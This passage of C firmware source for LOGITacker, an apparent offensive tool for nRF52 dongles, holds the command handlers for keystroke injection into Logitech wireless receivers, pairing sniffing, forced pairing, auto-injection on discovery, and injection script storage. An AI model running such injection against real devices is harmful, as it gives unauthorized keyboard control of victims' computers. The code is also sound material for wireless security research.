            NRF_LOG_WARNING("Failed to open record %08x", err);
            continue; // go on with next
        }

        sprintf((char *) tmp_str, "Record file_id %04x record_key %04x", flash_record.p_header->file_id, flash_record.p_header->record_key);
        NRF_LOG_INFO("%s",nrf_log_push((char*) tmp_str));

        if (fds_record_close(&rd) != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to close record");
        }

    }
}
#endif

static void cmd_version(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "LOGITacker by MaMe82\r\n");
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "Version: %s\r\n", VERSION_STRING);
}


void callback_dummy(nrf_fstorage_evt_t * p_evt) {};
NRF_FSTORAGE_DEF(nrf_fstorage_t m_nfs) =
        {
                .evt_handler    = callback_dummy,
//                .start_addr     = 0xFD000,
//                .end_addr       = 0xFFFFF,
        };
static bool nfs_initiated = false;

static void cmd_erase_flash(nrf_cli_t const * p_cli, size_t argc, char **argv) {
/*
    fds_find_token_t ft;
    memset(&ft, 0x00, sizeof(fds_find_token_t));
    fds_record_desc_t rd;
    while (fds_record_iterate(&rd,&ft) == FDS_SUCCESS) {
        NRF_LOG_INFO("Deleting record...")
        fds_record_delete(&rd);
    }
    fds_gc();
    fds_stat_t stats;
    fds_stat(&stats);
*/

    uint32_t flash_size  = (FDS_PHY_PAGES * FDS_PHY_PAGE_SIZE * sizeof(uint32_t));
    uint32_t end_addr   = helper_flash_end_addr();
    uint32_t start_addr = end_addr - flash_size;

    m_nfs.start_addr = start_addr;
    m_nfs.end_addr = end_addr;


    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Erasing flash from start addr: %x, pages: %d\n", start_addr, FDS_PHY_PAGES);

/*
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Freeable words:  %d\n", stats.freeable_words);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Largest contig:  %d\n", stats.largest_contig);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Words used:      %d\n", stats.words_used);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Words reserved:  %d\n", stats.words_reserved);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Dirty records:   %d\n", stats.dirty_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Valid records:   %d\n", stats.valid_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Open records:    %d\n", stats.open_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Pages available: %d\n", stats.pages_available);
    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Corruption:      %s\n", stats.corruption ? "yes" : "no");
*/

    if (!nfs_initiated) {
        if (nrf_fstorage_init(&m_nfs, &nrf_fstorage_nvmc, NULL) == NRF_SUCCESS) nfs_initiated = true;
    }
    if (nfs_initiated) nrf_fstorage_erase(&m_nfs, start_addr, FDS_PHY_PAGES, NULL);

    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "... page erase issued, wait some seconds and re-plug the dongle\n");
}

static void cmd_inject(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    nrf_cli_help_print(p_cli, NULL, 0);
}

static void cmd_inject_target(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "inject target %s\r\n", argv[1]);

    if (argc > 1)
    {
        //nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);

        //parse arg 1 as address
        uint8_t addr[5];
        if (strcmp(argv[1], "USB") == 0) {
            memset(addr,0x00,5);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes to USB keyboard interface\r\n");
        } else {
            if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
                return;
            }

            char tmp_addr_str[16];
            helper_addr_to_hex_str(tmp_addr_str, 5, addr);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
        }

        //logitacker_keyboard_map_test();
        logitacker_enter_mode_injection(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "device address needed, format has to be xx:xx:xx:xx:xx\r\n");
        return;

    }

}

static void cmd_script_store(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc == 2)
    {
        if (logitacker_script_engine_store_current_script_to_flash(argv[1])) {
            //NRF_LOG_INFO("storing script succeeded");
            return;
        }
        //NRF_LOG_INFO("Storing script failed");
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "store needs a scriptname as first argument\r\n");
        return;

    }

}

static void cmd_script_load(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc == 2)
    {
        if (logitacker_script_engine_load_script_from_flash(argv[1])) {
            NRF_LOG_INFO("loading script succeeded");
            return;
        }
        NRF_LOG_INFO("loading script failed");
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "load needs a script name as first argument\r\n");
        return;

    }

}

static void cmd_script_remove(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc == 2)
    {
        if (logitacker_script_engine_delete_script_from_flash(argv[1])) {
            NRF_LOG_INFO("deleting script succeeded");
            return;
        }
        NRF_LOG_INFO("deleting script failed");
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "delete needs a script name as first argument\r\n");
        return;

    }
}

static void cmd_script_list(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_list_scripts_from_flash(p_cli);
}

/*
static void cmd_inject_pause(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_injection_start_execution(false);
}
*/

static void cmd_inject_execute(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_injection_start_execution(true);
}

static void cmd_script_clear(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_flush_tasks();
    NRF_LOG_INFO("script tasks cleared");
}

static void cmd_script_undo(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_remove_last_task();
    NRF_LOG_INFO("removed last task from script");
}

static void cmd_inject_onsuccess_continue(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_CONTINUE;
}

static void cmd_inject_onsuccess_activeenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_SWITCH_ACTIVE_ENUMERATION;
}

static void cmd_inject_onsuccess_passiveenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_SWITCH_PASSIVE_ENUMERATION;
}

static void cmd_inject_onsuccess_discover(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_success = OPTION_AFTER_INJECT_SWITCH_DISCOVERY;
}

static void cmd_inject_onfail_continue(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_CONTINUE;
}

static void cmd_inject_onfail_activeenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_SWITCH_ACTIVE_ENUMERATION;
}

static void cmd_inject_onfail_passiveenum(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_SWITCH_PASSIVE_ENUMERATION;
}

static void cmd_inject_onfail_discover(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.inject_on_fail = OPTION_AFTER_INJECT_SWITCH_DISCOVERY;
}

static void cmd_option_global_workmode_unifying(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_UNIFYING;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to Unifying compatible\r\n");
}

static void cmd_option_global_workmode_lightspeed(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_LIGHTSPEED;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to LIGHTSPEED compatible\r\n");
}

static void cmd_option_global_workmode_g700(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_G700;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to G700/G700s compatible\r\n");
}

static void cmd_option_global_bootmode_discover(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.bootmode = OPTION_LOGITACKER_BOOTMODE_DISCOVER;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "boot mode set to 'discover'\r\n");
}

static void cmd_option_global_bootmode_usbinject(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.bootmode = OPTION_LOGITACKER_BOOTMODE_USB_INJECT;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "boot mode set to 'usb inject'\r\n");
}

static void cmd_option_global_usbinjecttrigger_onpowerup(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.usbinject_trigger = OPTION_LOGITACKER_USBINJECT_TRIGGER_ON_POWERUP;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "USB injection mode set to 'on power up'\r\n");
}

static void cmd_option_global_usbinjecttrigger_onledupdate(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.usbinject_trigger = OPTION_LOGITACKER_USBINJECT_TRIGGER_ON_LEDUPDATE;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "USB injection mode set to 'on LED state update'\r\n");
}

static void cmd_options_inject_lang(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc == 2)
    {
        logitacker_script_engine_set_language_layout(logitacker_keyboard_map_lang_from_str(argv[1]));

        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "need language layout name as first argument (f.e. us, de, da)\r\n");

        return;

    }

}

static void cmd_script_show(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_script_engine_print_current_tasks(p_cli);
}

static void cmd_script_string(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    char press_str[NRF_CLI_CMD_BUFF_SIZE] = {0};
    int str_buf_remaining = sizeof(press_str)-1; //keep one byte for terminating 0x00
    for (int i=1; i<argc && str_buf_remaining>0; i++) {
        if (i>1) strcat(press_str, " ");
        str_buf_remaining--;
        int len = strlen(argv[i]);
        if (len > str_buf_remaining) len = str_buf_remaining;
        strncat(press_str, argv[i], len);
        str_buf_remaining -= len;
    }

    logitacker_script_engine_append_task_type_string(press_str);
}

static void cmd_script_altstring(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    char press_str[NRF_CLI_CMD_BUFF_SIZE] = {0};
    int str_buf_remaining = sizeof(press_str)-1; //keep one byte for terminating 0x00
    for (int i=1; i<argc && str_buf_remaining>0; i++) {
        if (i>1) strcat(press_str, " ");
        str_buf_remaining--;
        int len = strlen(argv[i]);
        if (len > str_buf_remaining) len = str_buf_remaining;
        strncat(press_str, argv[i], len);
        str_buf_remaining -= len;
    }

    logitacker_script_engine_append_task_type_altstring(press_str);
}

static void cmd_script_delay(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1) {
        uint32_t delay_ms;
        if (sscanf(argv[1], "%lu", &delay_ms) != 1) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid delay, argument has to be unsigned int\r\n");
        };

        logitacker_script_engine_append_task_delay(delay_ms);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid delay, argument has to be unsigned int\r\n");
}

static void cmd_script_press(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    char press_str[NRF_CLI_CMD_BUFF_SIZE] = {0};
    int str_buf_remaining = sizeof(press_str)-1; //keep one byte for terminating 0x00
    for (int i=1; i<argc && str_buf_remaining>0; i++) {
        if (i>1) strcat(press_str, " ");
        str_buf_remaining--;
        int len = strlen(argv[i]);
        if (len > str_buf_remaining) len = str_buf_remaining;
        strncat(press_str, argv[i], len);
        str_buf_remaining -= len;
    }

    NRF_LOG_INFO("parsing '%s' to HID key combo report:", nrf_log_push(press_str));

    hid_keyboard_report_t tmp_report;
    logitacker_keyboard_map_combo_str_to_hid_report(press_str, &tmp_report, LANGUAGE_LAYOUT_DE);
    NRF_LOG_HEXDUMP_INFO(&tmp_report, sizeof(hid_keyboard_report_t));

    logitacker_script_engine_append_task_press_combo(press_str);
}


static void cmd_discover_onhit_activeenum(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_SWITCH_ACTIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: start active enumeration of new RF address\r\n");
    return;
}

static void cmd_discover_onhit_passiveenum(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_SWITCH_PASSIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: start passive enumeration of new RF address\r\n");
    return;
}

static void cmd_discover_onhit_autoinject(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_SWITCH_AUTO_INJECTION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: enter injection mode and execute injection\r\n");
    return;
}

static void cmd_discover_onhit_continue(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    g_logitacker_global_config.discovery_on_new_address = OPTION_DISCOVERY_ON_NEW_ADDRESS_CONTINUE;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-hit action: continue\r\n");
}

static void cmd_pair_sniff_onsuccess_continue(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_CONTINUE;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: continue\r\n");
}

static void cmd_pair_sniff_onsuccess_discover(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_DISCOVERY;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter discover mode\r\n");
}

static void cmd_pair_sniff_onsuccess_passiveenum(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_PASSIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter passive enumeration mode\r\n");
}

static void cmd_pair_sniff_onsuccess_activeenum(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_ACTIVE_ENUMERATION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter active enumeration mode\r\n");
}

static void cmd_pair_sniff_onsuccess_autoinject(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.pair_sniff_on_success = OPTION_PAIR_SNIFF_ON_SUCCESS_SWITCH_AUTO_INJECTION;
    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "on-success action: enter injection mode and execute injection\r\n");
}

static void cmd_pair_sniff_run(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_enter_mode_pair_sniff();
}

static void cmd_pair_device_run(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to force pair using address %s\r\n", tmp_addr_str);
        logitacker_enter_mode_pair_device(addr);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to pair using Unifying global pairing address\r\n");
    logitacker_enter_mode_pair_device(UNIFYING_GLOBAL_PAIRING_ADDRESS);
}

static void cmd_help(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    nrf_cli_help_print(p_cli, NULL, 0);
}

static void cmd_pair(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if ((argc == 1) || nrf_cli_help_requested(p_cli))
    {
        nrf_cli_help_print(p_cli, NULL, 0);
        return;
    }

    if (argc != 2)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: bad parameter count\r\n", argv[0]);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: unknown parameter: %s\r\n", argv[0], argv[1]);
}

static void cmd_discover_run(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_enter_mode_discovery();
}

static void cmd_discover(nrf_cli_t const * p_cli, size_t argc, char **argv)
{
    if ((argc == 1) || nrf_cli_help_requested(p_cli))
    {
        nrf_cli_help_print(p_cli, NULL, 0);
        return;
    }

    if (argc != 2)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: bad parameter count\r\n", argv[0]);
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "%s: unknown parameter: %s\r\n", argv[0], argv[1]);
}

static void cmd_devices(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_devices_list_iterator_t iter = {0};
    logitacker_devices_unifying_dongle_t * p_dongle = NULL;
    logitacker_devices_unifying_device_t * p_device = NULL;
    while (logitacker_devices_get_next_dongle(&p_dongle, &iter) == NRF_SUCCESS) {
        if (p_dongle != NULL) {

            for (int device_index=0; device_index < p_dongle->num_connected_devices; device_index++) {
                p_device = p_dongle->p_connected_devices[device_index];

                print_logitacker_device_info(p_cli, p_device);
            }
        }
    }
}

static void cmd_devices_remove(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Deleting device %s\r\n", tmp_addr_str);
        logitacker_devices_del_device(addr);
        return;
    }
}

static void cmd_devices_add(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_devices_unifying_device_t * p_device;
    if (argc > 1)
    {
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "adding device %s as plain injectable keyboard\r\n");

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Adding device %s\r\n", tmp_addr_str);


        if (logitacker_devices_create_device(&p_device, addr) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "Error adding device %s\r\n", tmp_addr_str);
            return;
        }

        // add keyboard capabilities
        p_device->report_types |= LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD | LOGITACKER_DEVICE_REPORT_TYPES_MEDIA_CENTER | LOGITACKER_DEVICE_REPORT_TYPES_MULTIMEDIA | LOGITACKER_DEVICE_REPORT_TYPES_POWER_KEYS;

        if (argc > 2) {
            uint8_t key[16] = {0};
            if (helper_hex_str_to_bytes(key, 16, argv[2]) != NRF_SUCCESS) {
                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid key parameter, format has to be xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\r\n");
                return;
            }

            // add key and mark device as link-encryption enabled
            memcpy(p_device->key, key, 16);
            p_device->key_known = true;
            p_device->caps |= LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION;

            nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "added key to device\r\n");
        }
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "syntax to add a device manually:\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "    devices add <RF-address> [AES key]\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "example device no encryption   : devices add de:ad:be:ef:01\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "example device with encryption : devices add de:ad:be:ef:02 023601e63268c8d37988847af1ae40a1\r\n");
    };
}

static void cmd_devices_storage_save(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Storing device %s to flash\r\n", tmp_addr_str);
        logitacker_devices_store_ram_device_to_flash(addr);
        return;
    }
}

// dynamic creation of command addresses
static void cmd_devices_storage_remove(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {
        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Deleting device %s from flash\r\n", tmp_addr_str);
        logitacker_devices_remove_device_from_flash(addr);
        return;
    }

}

static void cmd_devices_storage_load(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {
        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Restoring device %s from flash\r\n", tmp_addr_str);
        logitacker_devices_unifying_device_t * p_dummy_device;
        logitacker_devices_restore_device_from_flash(&p_dummy_device, addr);
        return;
    }
}

static void cmd_devices_storage_list(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    fds_find_token_t ftok;
    fds_record_desc_t record_desc;
    fds_flash_record_t flash_record;
    memset(&ftok, 0x00, sizeof(fds_find_token_t));

    logitacker_devices_unifying_device_t tmp_device;
    logitacker_devices_unifying_dongle_t tmp_dongle;

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "list of devices stored on flash:\r\n");
    NRF_LOG_INFO("Devices on flash");
    while(fds_record_find(LOGITACKER_FLASH_FILE_ID_DEVICES, LOGITACKER_FLASH_RECORD_KEY_DEVICES, &record_desc, &ftok) == FDS_SUCCESS) {
        if (fds_record_open(&record_desc, &flash_record) != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to open record");
            continue; // go on with next
        }

        logitacker_devices_unifying_device_t const * p_device = flash_record.p_data;

        //we need a writable copy of device to assign dongle data
        memcpy(&tmp_device, p_device, sizeof(logitacker_devices_unifying_device_t));



        if (fds_record_close(&record_desc) != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to close record")
        }

        // load stored dongle (without dongle data, classification like "is logitech" would be missing)
        if (logitacker_flash_get_dongle_for_device(&tmp_dongle, &tmp_device) == NRF_SUCCESS) tmp_device.p_dongle = &tmp_dongle;
        print_logitacker_device_info(p_cli, &tmp_device);

    }
}


static void cmd_devices_remove_all(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_devices_del_all();
}

static void cmd_options_show(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    logitacker_options_print(p_cli);
}

static void cmd_options_inject_maxautoinjectsperdevice(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1) {
        int count;
        if (sscanf(argv[1], "%d", &count) != 1) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, auto inject count has to be a integer number, but '%s' was given\r\n", argv[1]);
        } else {
            g_logitacker_global_config.max_auto_injects_per_device = count;
        }
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, auto inject count has to be a integer number\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "current setting of maximum per device auto-injects: %d\r\n", g_logitacker_global_config.max_auto_injects_per_device);
    }
}

static void cmd_options_store(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    logitacker_options_store_to_flash();
}

static void cmd_options_erase(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    fds_file_delete(LOGITACKER_FLASH_FILE_ID_GLOBAL_OPTIONS);
}

static void cmd_options_inject_defaultscript(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1) {
        size_t len = strlen(argv[1]);
        if (len > LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN-1) len = LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN-1;
        memcpy(g_logitacker_global_config.default_script, argv[1], len);
        g_logitacker_global_config.default_script[len] = 0x00;
        return;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "default injection script: '%s'\r\n", g_logitacker_global_config.default_script);
}

static void cmd_options_inject_defaultscript_clear(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    g_logitacker_global_config.default_script[0] = 0x00;
}

static void cmd_options_pairsniff_autostoredevice(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.auto_store_sniffed_pairing_devices = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.auto_store_sniffed_pairing_devices = true;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "auto-store devices after pairing has been sniffed successfully: %s\r\n", g_logitacker_global_config.auto_store_sniffed_pairing_devices ? "on" : "off");
}

static void cmd_options_discover_autostoreplain(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.auto_store_plain_injectable = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.auto_store_plain_injectable = true;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "auto-store discovered devices, if they allow plain injection: %s\r\n", g_logitacker_global_config.auto_store_plain_injectable ? "on" : "off");
}

static void cmd_options_passiveenum_pass_keyboard(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.passive_enum_pass_through_keyboard = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.passive_enum_pass_through_keyboard = true;
    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "passive-enum USB keyboard pass-through: %s\r\n", g_logitacker_global_config.passive_enum_pass_through_keyboard ? "on" : "off");
}

static void cmd_options_passiveenum_pass_mouse(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.passive_enum_pass_through_mouse = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.passive_enum_pass_through_mouse = true;

    }

